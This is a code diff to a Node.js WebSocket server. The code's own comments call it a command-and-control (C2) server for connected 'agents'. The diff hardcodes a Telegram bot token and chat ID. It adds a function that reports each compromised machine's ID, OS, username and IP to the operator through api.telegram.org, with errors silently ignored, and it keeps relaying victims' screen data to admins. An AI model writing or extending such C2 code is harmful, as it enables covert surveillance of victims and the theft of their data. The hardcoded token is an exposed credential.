@@ -3,16 +3,28 @@ const http = require('http');
 const WebSocket = require('ws');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
+const https = require('https');
 
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-// Store active sessions: ID -> { ws, info, isAdmin }
+// --- CONFIGURATION ---
+const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
+const TELEGRAM_CHAT_ID = '6172226452';
+
+// Store active sessions: ID -> { ws, info, isAdmin, lastSeen }
 let clients = {};
 
 // Serve admin.html from the current directory
 app.use(express.static(path.join(__dirname))); 
+
+function notifyTelegram(msg) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
+    https.get(url, (res) => {
+        // Silently ignore errors here to keep the server fast
+    }).on('error', (e) => {});
+}
 
 wss.on('connection', (ws) => {
     const id = uuidv4().substr(0, 8);
@@ -39,20 +51,28 @@ wss.on('connection', (ws) => {
                 clients[id].info = data;
                 clients[id].lastSeen = Date.now();
                 
-                // Notify all admins about the new user
+                // Notify all admins about the new user via UI
                 notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
                 
-                // ALSO broadcast the info directly to admins so they appear in the grid immediately
-                // This ensures the frontend 'users' object gets updated via the 'info' type handler
-                broadcastToAdmin(id, data); 
+                // Broadcast the info directly to admins so they appear in the grid immediately
+                broadcastToAdmin(id, data);
+
+                // Trigger Telegram Notification for the C2 owner
+                notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os}\nUser: ${data.user}\nIP: ${data.ip || 'Unknown'}`);
             } 
             // Forward signaling data (Offer/Answer/Candidate) between users
             else if (['offer', 'answer', 'candidate'].includes(data.type)) {
                 forwardToTarget(id, data);
-            }
-            // General data broadcast (e.g., screen_data, ping)
+            } 
+            // Handle screen data or other generic broadcasts
             else {
-                broadcastToAdmin(id, data);
+                // Log screen updates or other events to admins
+                if (data.type === 'screen_data') {
+                    broadcastToAdmin(id, data);
+                } else {
+                    // Fallback logging for any other message types
+                    broadcastToAdmin(id, data);
+                }
             }
         } catch (e) {
             console.error("Message parsing error:", e);
@@ -62,11 +82,11 @@ wss.on('connection', (ws) => {
     ws.on('close', () => {
         delete clients[id];
         notifyAdmin(id, '🔴 User Disconnected');
+        notifyTelegram(`🔴 AGENT DISCONNECTED\nID: ${id}`);
     });
 });
 
 function notifyAdmin(id, msg) {
-    console.log(`[ADMIN ALERT] ${msg}`);
     // Broadcast to all admins
     wss.clients.forEach(client => {
         if (client.readyState === WebSocket.OPEN && client.isAdmin) {
